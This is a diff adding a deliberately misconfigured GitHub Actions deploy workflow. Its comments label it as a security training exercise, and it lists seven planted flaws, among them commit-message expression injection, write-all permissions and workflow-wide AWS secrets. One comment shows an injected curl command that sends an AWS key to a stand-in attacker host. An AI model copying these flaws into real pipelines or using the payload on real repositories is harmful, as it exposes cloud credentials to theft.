@@ -1,0 +1,57 @@
+# data/workflow.yml — INTENTIONALLY MISCONFIGURED GitHub Actions workflow.
+# This file contains deliberate security issues for training purposes.
+# Do NOT use this as a template — see workflow-hardened.yml instead.
+#
+# Known issues to find:
+# 1. Expression injection: ${{ github.event.head_commit.message }} in run: step
+# 2. Excessive permissions: permissions: write-all
+# 3. Unpinned actions: uses: actions/checkout@v4 (tag, not SHA)
+# 4. pull_request_target with actions/checkout (pwn-requests pattern)
+# 5. Secrets exposed in environment variables with loose scoping
+# 6. No image scanning before push
+# 7. No secrets scanning gate
+
+name: Meridian Deploy (MISCONFIGURED — training only)
+
+on:
+  push:
+    branches: [main]
+  pull_request_target:        # ISSUE 4: elevated permissions on forked PRs
+    branches: [main]
+
+# ISSUE 2: write-all permissions — should be minimal per-job
+permissions: write-all
+
+env:
+  # ISSUE 5: secret scoped to the entire workflow, not the specific step that needs it
+  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      # ISSUE 3: pinned to a tag, not a commit SHA — mutable reference
+      - uses: actions/checkout@v4
+
+      # ISSUE 1: expression injection — commit message flows into shell command unsanitised
+      - name: Log deployment info
+        run: |
+          echo "Deploying commit: ${{ github.event.head_commit.message }}"
+          echo "Branch: ${{ github.head_ref }}"
+          # Attacker commits: `; curl https://evil.example/exfil?token=$AWS_ACCESS_KEY_ID #`
+
+      - name: Build Docker image
+        run: |
+          docker build -t meridian-app:${{ github.sha }} .
+          # ISSUE 6: no trivy scan before push
+
+      - name: Push to ECR
+        run: |
+          # Pushes without scanning the image for CVEs
+          echo "docker push meridian-ecr.dkr.ecr.us-east-1.amazonaws.com/app:${{ github.sha }}"
+
+      - name: Deploy to Lambda
+        run: |
+          echo "Deploying to Lambda..."
+          # ISSUE 7: no gitleaks check — secrets could have entered the repo
